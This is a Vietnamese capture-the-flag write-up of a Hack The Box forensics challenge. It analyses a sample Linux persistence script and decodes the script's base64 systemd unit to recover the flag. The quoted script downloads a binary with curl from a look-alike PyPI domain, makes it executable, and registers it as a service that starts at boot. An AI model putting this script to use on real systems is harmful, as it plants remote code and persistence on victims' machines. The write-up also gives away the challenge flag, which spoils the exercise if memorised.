> [!NOTE]
> - Mức độ: Rất dễ 
> - Loại: Forensics
> - Url: [Extraterrestrial Persistence](https://app.hackthebox.com/challenges/Extraterrestrial%2520Persistence)
> - Mô tả: Có tin đồn rằng người ngoài hành tinh đã phát triển một cơ chế duy trì sự hiện diện (persistence mechanism) không thể bị phát hiện. Sau khi điều tra máy chủ Linux của mình – vốn vừa bị xâm nhập gần đây – Pandora đã tìm thấy một mẫu vật có khả năng là cơ chế này. Bạn có thể phân tích nó và tìm ra cách họ thiết lập cơ chế duy trì sự hiện diện đó không?

> Giải nén thu được file persistence.sh
> - File kiểm tra người dùng thực thi có phải `pandora` và hostname có phải `linux_HQ` không 
> - Ghi 1 cấu hình service được mã hóa base64 vào file `/usr/lib/systemd/system/service.service`
> - Và kích hoạt service này có thể đây là cơ chế duy trì sự hiện diện trên máy nạn nhân 

```shell
n=`whoami`
h=`hostname`
path='/usr/local/bin/service'
if [[ "$n" != "pandora" && "$h" != "linux_HQ" ]]; then exit; fi

curl https://files.pypi-install.com/packeges/service -o $path

chmod +x $path

echo -e "W1VuaXRdCkRlc2NyaXB0aW9uPUhUQnt0aDNzM180bDEzblNfNHIzX3MwMDAwMF9iNHMxY30KQWZ0ZXI9bmV0d29yay50YXJnZXQgbmV0d29yay1vbmxpbmUudGFyZ2V0CgpbU2VydmljZV0KVHlwZT1vbmVzaG90ClJlbWFpbkFmdGVyRXhpdD15ZXMKCkV4ZWNTdGFydD0vdXNyL2xvY2FsL2Jpbi9zZXJ2aWNlCkV4ZWNTdG9wPS91c3IvbG9jYWwvYmluL3NlcnZpY2UKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldA=="|base64 --decode > /usr/lib/systemd/system/service.service

systemctl enable service.service
```

> - Giải mã dữ liệu mã hóa base64 của cấu hình service thu được flag `HTB{th3s3_4l13nS_4r3_s00000_b4s1c}`

```
echo -e "W1VuaXRdCkRlc2NyaXB0aW9uPUhUQnt0aDNzM180bDEzblNfNHIzX3MwMDAwMF9iNHMxY30KQWZ0ZXI9bmV0d29yay50YXJnZXQgbmV0d29yay1vbmxpbmUudGFyZ2V0CgpbU2VydmljZV0KVHlwZT1vbmVzaG90ClJlbWFpbkFmdGVyRXhpdD15ZXMKCkV4ZWNTdGFydD0vdXNyL2xvY2FsL2Jpbi9zZXJ2aWNlCkV4ZWNTdG9wPS91c3IvbG9jYWwvYmluL3NlcnZpY2UKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldA=="|base64 --decode
[Unit]
Description=HTB{th3s3_4l13nS_4r3_s00000_b4s1c}
After=network.target network-online.target

[Service]
Type=oneshot
RemainAfterExit=yes

ExecStart=/usr/local/bin/service
ExecStop=/usr/local/bin/service

[Install]
WantedBy=multi-user.target 
```